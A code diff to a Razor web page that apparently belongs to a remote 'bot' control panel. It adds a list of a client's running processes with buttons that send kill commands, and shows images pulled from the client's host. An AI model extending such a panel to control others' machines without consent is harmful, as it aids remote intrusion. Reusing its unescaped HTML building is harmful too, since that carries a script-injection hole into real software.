@@ -48,15 +48,24 @@
             <div class="col-2 text-center">@Localizer["Performance"]</div>
             <div class="col-5 text-right">@Localizer["Other information"]</div>
         </div>
-        <div class="row" id="deatils">
+        <div class="row BotDeatils" id="deatils">
             
+        </div>
+        <div class="row mt-3 bg-head-color mb-2 font-weight-bold">
+            <div class="col-1 text-truncate">@Localizer["ID"]</div>
+            <div class="col-4 text-left">@Localizer["Process Name"]</div>
+            <div class="col-6 text-right">@Localizer["Description"]</div>
+            <div class="col-1 text-center">Close</div>
+        </div>
+        <div class="row BotDeatils" id="process">
+
         </div>
         <div class="row mt-3">
             <div class="col-12"><h2>@Localizer["Images"]</h2></div>
             <div class="col-12"><hr /></div>
             <div class="col-12">
                 <div class="row" id="list">
-                   @foreach (string i in Model.newImagesJsonModel.Images)
+                    @foreach (string i in Model.newImagesJsonModel.Images)
                     {
                         <div class="col-2 mt-2">
                             <a href="http://@Model.newBotDeatilsInquiryModel.Domain:50371/GetImg?@i" data-lightbox="BotImages">
@@ -73,8 +82,32 @@
 <script src="~/js/lightbox.js"></script>
 <script type="text/javascript">
     $(document).ready(function () {
-        $.get("/List/BotGetDeatils?=" + @ViewData["ID"], function (data, status) {
+        deatils();
+        process();
+    });
+    $("#process").on('click',".close-btn", function (event) {
+        console.log($(this).attr('alt-href'));
+        event.preventDefault();
+        $.get($(this).attr('alt-href'), function (data, status) {
             console.log(data);
+            data = JSON.parse(data);
+            //$.notify("Access granted", "success", { position:"right" });
+        });
+    });
+    function process() {
+        $.get("/List/BotGetProcess?=" + @ViewData["ID"], function (data, status) {
+            data = JSON.parse(data);
+            for (i = 0; i < data.length; i++) {
+                $("#process").append('<div class="col-1 text-truncate font-size-down">' + data[i].Id + '</div>' + 
+                                        '<div class="col-4 text-left text-truncate font-size-down">' + data[i].ProcessName + '</div>' +
+                    '<div class="col-6 text-truncate text-right font-size-down" title="' + data[i].description + '">' + data[i].description + '</div>' + 
+                    '<div class="col-1 text-center"><button class="close-btn" alt-href="/Commands/KillProcess?=' + data[i].Id + '"><img src="/img/LightBoxImages/close.png" width="10"></button></div>');
+            }
+        });
+    }
+    function deatils() {
+        $.get("/List/BotGetDeatils?=" + @ViewData["ID"], function (data, status) {
+            //console.log(data);
             for (i = 0; i < data.length; i++) {
                 $("#deatils").append('<div class="col-3 text-truncate font-size-down" title="' + data[i].hardwareName.replace("Name:", "") + '">' + data[i].hardwareName.replace("Name:", "") + '</div>' + 
                                         '<div class="col-2 text-left text-truncate font-size-down">' + data[i].hardwareType.replace("Type:", "") + '</div>' +
@@ -82,5 +115,5 @@
                                         '<div class="col-5 text-truncate text-right font-size-down" title="' + data[i].otherInformation + '">' + data[i].otherInformation + '</div>');
             }
         });
-    });
+    }
 </script>
